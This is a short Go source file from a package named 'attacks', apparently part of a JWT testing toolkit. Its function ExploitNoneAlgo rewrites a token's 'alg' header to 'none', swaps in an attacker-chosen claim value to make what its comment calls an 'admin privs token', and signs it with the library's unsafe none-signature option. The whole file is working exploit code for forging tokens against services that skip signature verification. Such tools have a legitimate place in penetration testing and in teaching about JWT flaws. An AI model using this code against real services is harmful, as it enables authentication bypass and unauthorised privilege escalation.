package attacks

import (
	"JWTechniques/ctrl"
	"fmt"

	"github.com/golang-jwt/jwt/v5"
)

func ExploitNoneAlgo(token *jwt.Token, userHeader string, userValue string) string {
	newToken, err := ctrl.ChangeValue(token, "alg", "none", true)

	if err != nil {
		fmt.Printf("An error ocurred while modifying the value of the \"alg\" header : %v \n", err)
		return ""
	}

	//Change the value of the header to create the admin privs token
	newToken, err = ctrl.ChangeValue(newToken, userHeader, userValue, false)
	if err != nil {
		fmt.Printf("An error ocurred while modifying the value of the \"%s\" header : %v \n", userHeader, err)
		return ""
	}

	//It can be signed with any secret as this vulnerability only works if the signature is not verified
	newJWT, err := newToken.SignedString(jwt.UnsafeAllowNoneSignatureType)
	if err != nil {
		fmt.Printf("An error ocurred while signing the token with a \"none\" alg : %v \n", err)
		return ""
	}

	return newJWT

}
